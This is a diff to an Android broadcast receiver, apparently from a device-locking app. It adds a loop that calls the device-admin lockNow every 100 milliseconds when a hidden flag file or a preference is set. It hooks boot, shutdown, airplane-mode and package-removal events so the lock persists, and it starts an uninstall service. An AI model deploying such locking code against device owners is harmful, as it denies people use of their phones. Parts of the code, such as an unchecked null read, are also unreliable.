@@ -11,17 +11,22 @@ import android.content.BroadcastReceiver;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
+import android.os.Handler;
 import android.os.UserManager;
 import android.util.Log;
 import android.view.KeyEvent;
 import android.widget.Toast;
 
+import androidx.annotation.RequiresApi;
 
+import java.io.FileInputStream;
+import java.io.IOException;
 
 
 public class BroadcastReciever extends BroadcastReceiver {
@@ -30,18 +35,30 @@ public class BroadcastReciever extends BroadcastReceiver {
     private static final String tag = "TestReceiver";
     private BackgroundService backgroundService;
     private BackgroundDelayService backgroundDelayService;
+    private UninstallService uninstallService;
     Intent mServiceIntent;
+    Intent getmServiceIntent;
 
 
     public ComponentName mDeviceAdmin;
-    public DevicePolicyManager mDPM;
+    DevicePolicyManager dpm;
 
     Boolean screenOff;
+    SharedPreferences sharedPreferences ;
+    private String filename = "q1w2e3r4t5y6u7i8o9p0.txt";
+
+    Context context1;
 
     @Override
     public void onReceive(Context context, Intent intent) {
 
         String action = intent.getAction();
+        sharedPreferences = context. getSharedPreferences("LockingState",Context.MODE_PRIVATE);
+        Boolean status = sharedPreferences.getBoolean("status", false);
+        dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+
+        context1 = context;
+
         if(("android.intent.action.BOOT_COMPLETED").equals(action) ||
                 ("restart.service").contains(action) ||
                 ("android.intent.action.ACTION_BOOT_COMPLETED").equals(action) ||
@@ -52,11 +69,42 @@ public class BroadcastReciever extends BroadcastReceiver {
                 ("android.intent.action.BATTERY_CHANGED").contains(action) ||
                 ("android.intent.action.ACTION_POWER_CONNECTED").contains((action)) ||
                 ("android.intent.action.PACKAGE_REMOVED").contains((action)) ||
+                ("android.intent.action.ACTION_SHUTDOWN").contains((action)) ||
+                ("android.intent.action.AIRPLANE_MODE").contains((action)) ||
+                ("android.intent.action.SCREEN_ON").contains((action)) ||
+                ("android.intent.action.CONFIGURATION_CHANGED").contains((action)) ||
+                ("android.intent.action.REBOOT").contains((action)) ||
                 ("BackgroundProcess").equals(action) ||
                 ("android.app.action.DEVICE_ADMIN_ENABLED").equals(action)){
 
 //            context.startForegroundService(new Intent(context, BackgroundService.class));
 //            context.startForegroundService(new Intent(context, LocationService.class));
+
+            if(readData(context).equals("true")){
+
+                handler.post(runnableCode);
+                backgroundService = new BackgroundService();
+                mServiceIntent = new Intent(context, BackgroundService.class);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    context.startForegroundService(mServiceIntent);
+                }
+                else{
+                    context.startService(mServiceIntent);
+                }
+            }
+
+            if(status) {
+                dpm.lockNow();
+                backgroundService = new BackgroundService();
+                mServiceIntent = new Intent(context, BackgroundService.class);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    context.startForegroundService(mServiceIntent);
+                }
+                else{
+                    context.startService(mServiceIntent);
+                }
+            }
+
             backgroundService = new BackgroundService();
             mServiceIntent = new Intent(context, BackgroundService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -65,6 +113,7 @@ public class BroadcastReciever extends BroadcastReceiver {
             else{
                 context.startService(mServiceIntent);
             }
+
         }
     }
 
@@ -81,5 +130,59 @@ public class BroadcastReciever extends BroadcastReceiver {
         DownloadManager manager = (DownloadManager) context.getSystemService(Context.DOWNLOAD_SERVICE);
         manager.enqueue(request);
     }
+
+    private String readData(Context context) {
+        try {
+            FileInputStream fin = context.openFileInput(filename);
+            int a;
+            StringBuilder temp = new StringBuilder();
+            while ((a = fin.read()) != -1) {
+                temp.append((char) a);
+            }
+
+            // setting text from the file.
+            String data = temp.toString();
+            fin.close();
+            return data;
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+
+        return null;
+    }
+
+    Handler handler = new Handler();
+    private Runnable runnableCode = new Runnable() {
+        @RequiresApi(api = Build.VERSION_CODES.Q)
+        @Override
+        public void run() {
+            // Do something here on the main thread
+            Log.d("Handler------>", "Called on main thread");
+            dpm.lockNow();
+            handler.postDelayed(runnableCode, 100);
+            startService();
+        }
+    };
+
+    public void startService(){
+        backgroundService = new BackgroundService();
+        mServiceIntent = new Intent(context1, BackgroundService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            context1.startForegroundService(mServiceIntent);
+        }
+        else{
+            context1.startService(mServiceIntent);
+        }
+
+        uninstallService = new UninstallService();
+        getmServiceIntent = new Intent(context1, uninstallService.getClass());
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            context1.startForegroundService(getmServiceIntent);
+        }
+        else{
+            context1.startService(getmServiceIntent);
+        }
+    }
+
 
 }
